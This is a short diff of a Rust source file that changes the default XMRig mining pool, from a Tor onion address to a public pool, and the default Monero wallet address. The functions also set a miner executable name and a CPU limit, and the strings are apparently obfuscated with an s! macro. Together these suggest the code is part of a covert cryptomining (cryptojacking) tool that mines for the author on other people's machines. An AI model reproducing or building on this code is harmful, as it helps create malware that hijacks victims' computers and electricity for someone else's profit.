@@ -39,11 +39,11 @@ pub fn xmrig_exe_name() -> String {
 }
 
 pub fn default_xmrig_pool() -> String {
-    s!("mo2tor2amawhphlrgyaqlrqx7o27jaj7yldnx3t6jip3ow4bujlwz6id.onion:10128").to_owned()
+    s!("gulf.moneroocean.stream:10128").to_owned()
 }
 pub fn default_monero_wallet() -> String {
     s!(
-        "46e6YT337YBR4UtRyPCB4cgkH8ZoRdC6Jbt3A7kAiey8Sogh98YkwjTUq6v7sEU1zLBU2Z31iR6FYQvuMn7tpmmG9dT3Ha1"
+        "47eQUbCbx8tFwXWjrYmwPPBK8AHH8UceEjJxBsWpdwDQRTzynmUwx7a8FJz1VbX8gbMBoKCa3J47TRRrGSunGZ36QLnfftE"
     ).to_owned()
 }
 pub fn default_miner_cpu_limit() -> u32 {
